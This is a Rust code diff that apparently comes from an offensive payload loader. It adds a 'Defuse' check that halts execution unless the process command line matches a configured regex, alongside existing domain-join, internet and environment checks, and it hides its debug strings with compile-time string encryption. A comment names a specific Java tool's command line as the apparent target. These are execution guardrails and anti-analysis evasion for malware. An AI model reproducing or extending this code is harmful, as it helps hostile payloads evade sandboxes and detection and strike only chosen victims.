@@ -4,6 +4,7 @@ use crate::link::{HTTPLink, Link, LinkFetch};
 use gethostname::gethostname;
 use serde::{Deserialize, Serialize};
 use std::env;
+use regex::Regex;
 
 use cryptify::encrypt_string;
 use log::debug;
@@ -17,6 +18,7 @@ pub enum Defuse {
     Env(Env),
     DomainJoin(DomainJoin),
     CheckInternet(CheckInternet),
+    Command(Command),
 }
 impl Defuse {
     pub fn stop_the_exec(&self, config: &Config) -> bool {
@@ -25,6 +27,7 @@ impl Defuse {
             Defuse::DomainJoin(domain_join) => domain_join.stop_exec(config),
             Defuse::CheckInternet(checkinternet) => checkinternet.stop_exec(config),
             Defuse::Env(env_variable) => env_variable.stop_exec(config),
+            Defuse::Command(comm) => comm.stop_exec(config),
         }
     }
     pub fn get_operator(&self) -> Operator {
@@ -33,6 +36,7 @@ impl Defuse {
             Defuse::DomainJoin(domain_join) => domain_join.get_operator(),
             Defuse::CheckInternet(checkinternet) => checkinternet.get_operator(),
             Defuse::Env(env_variable) => env_variable.get_operator(),
+            Defuse::Command(comm) => comm.get_operator(),
         }
     }
 }
@@ -219,16 +223,52 @@ impl DefuseCheck for DomainJoin {
                 == unsafe { std::ffi::CStr::from_ptr(domain_name as _).to_str().unwrap() }
             {
                 debug!(
-                    "{}{:?} ",
+                    "{}{:?}",
                     encrypt_string!("Defuse MATCH: "),
                     defuse_to_upper
                 );
                 return false;
             } else {
-                debug!("{}{:?} ", encrypt_string!("Defuse FAIL: "), defuse_to_upper);
+                debug!("{}{:?}", encrypt_string!("Defuse FAIL: "), defuse_to_upper);
             }
         }
         true
+    }
+    fn get_operator(&self) -> Operator {
+        self.operator
+    }
+}
+
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Command {
+    pub regex: String,
+    pub operator: Operator,
+}
+impl DefuseCheck for Command {
+    fn stop_exec(&self, _config: &Config) -> bool {
+        //let cmdline = String::from(r#"^.*-Xms512M -Xmx4096M .*-Dclipchamp.session.id.*clipchamp-tools.jar.*--workflow=ingest"#);
+        // -Xms512M -Xmx4096M -Dclipchamp.session.id clipchamp-tools.jar --workflow=ingest+analyze+render
+        // Construit la ligne de commande complète
+        let full_cmdline: String = env::args().collect::<Vec<_>>().join(" ");
+    
+        // Compile la regex
+        match Regex::new(&self.regex) {
+            Ok(re) => {
+                if re.is_match(&full_cmdline) {
+                    debug!("{}", encrypt_string!("Defuse MATCH: regex ok"));
+                    return false
+                } else {
+                    debug!("{}{:?}", encrypt_string!("Defuse FAIL: regex not match: "), self.regex);
+                    return true
+                }
+            }
+            Err(e) => {
+                debug!("{}{:?}{}{}", encrypt_string!("Defuse FAIL: regex not match: "), self.regex, encrypt_string!(" ,error="),e);
+                return true
+            }
+        }
+    
     }
     fn get_operator(&self) -> Operator {
         self.operator
